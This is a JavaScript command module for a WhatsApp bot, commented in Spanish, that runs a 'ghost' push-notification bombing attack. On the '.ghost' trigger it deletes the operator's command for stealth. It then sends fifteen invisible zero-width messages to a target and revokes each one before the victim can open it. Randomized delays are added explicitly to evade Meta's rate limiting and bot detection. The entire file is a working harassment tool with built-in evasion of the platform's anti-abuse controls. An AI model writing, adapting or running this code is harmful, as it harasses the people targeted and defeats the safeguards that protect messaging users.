export default {
    name: 'bombardeo_push',
    match: (text) => /^\.ghost/i.test(text),
    execute: async ({ sock, remitente, msg }) => {
        
        try {
            // 1. Sigilo: Borramos tu comando de ejecución
            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

            // Configuración de la carga
            const iteraciones = 15; // 15 notificaciones seguidas (Riesgo bajo de ban, alta molestia)
            const invisible = '\u200E'; // Marca direccional Unicode (Ancho cero)

            for (let i = 0; i < iteraciones; i++) {
                
                // 2. Disparo: El servidor emite la notificación Push al hardware del objetivo
                const fantasma = await sock.sendMessage(remitente, { 
                    text: invisible 
                });

                // 3. Intercepción y destrucción
                // Revocamos el mensaje antes de que la víctima tenga tiempo físico de abrir la app.
                if (fantasma) {
                    await sock.sendMessage(remitente, { delete: fantasma.key });
                }

                // 4. Evasión del Firewall de Meta (Rate Limit)
                // Usamos un delay asimétrico (entre 400ms y 900ms) para que el servidor 
                // no detecte un patrón de script automatizado y nos lance un Error 479.
                const delay = Math.floor(Math.random() * (900 - 400 + 1) + 400);
                await new Promise(r => setTimeout(r, delay));
            }

        } catch (err) {
            console.error("Falla en saturación Push:", err);
        }
    }
};
